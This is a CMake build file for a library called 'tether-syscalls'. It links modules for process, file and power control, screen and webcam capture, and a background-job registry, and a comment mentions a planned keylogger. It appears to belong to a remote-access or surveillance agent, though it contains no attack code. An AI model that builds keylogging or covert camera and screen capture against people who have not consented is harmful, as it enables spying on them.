add_library(tether-syscalls STATIC
    matrix.cpp
    process.cpp
    file.cpp
    # Task 6.4: the power family (Windows ExitWindowsEx; Linux logind over
    # dlopen'd sd-bus - libsystemd is a RUNTIME dependency only).
    power.cpp
    # Task 6.5/6.6: PNG helpers + the capture and camera families behind
    # opencv4 (imgcodecs encode; videoio is the live camera source).
    image_png.cpp
    capture.cpp
    camera.cpp
    # The shared managed background-job lifecycle (camera today; the 6.7
    # keylogger plugs into the same registry).
    jobs.cpp)
target_include_directories(tether-syscalls PUBLIC ${CMAKE_CURRENT_SOURCE_DIR})

# opencv4 comes from the vcpkg manifest. Feature pick (documented because
# the manifest JSON carries no comments): default-features OFF constrains
# the port away from its heavy extras (gtk/highgui/gapi/dnn/protobuf/qt,
# and ffmpeg's static build). Kept: 'png' (imencode/imdecode for the
# capture and camera deliverables) and the platform camera backends 'v4l'
# (linux) / 'dshow'+'msmf' (windows) - those features have EMPTY
# port-dependency lists, so no extra dependency graph is pulled. core and
# imgproc are built unconditionally by the port.
find_package(OpenCV CONFIG REQUIRED COMPONENTS core imgcodecs videoio)
target_link_libraries(tether-syscalls PUBLIC opencv_core opencv_imgcodecs opencv_videoio)

if(UNIX)
    # Task 6.5: the Linux capture family is own-library X11 (XGetImage),
    # benchmarked against shelling to scrot/xwd (docs/capture-notes.md).
    find_package(X11 REQUIRED)
    target_link_libraries(tether-syscalls PUBLIC X11::X11)
endif()
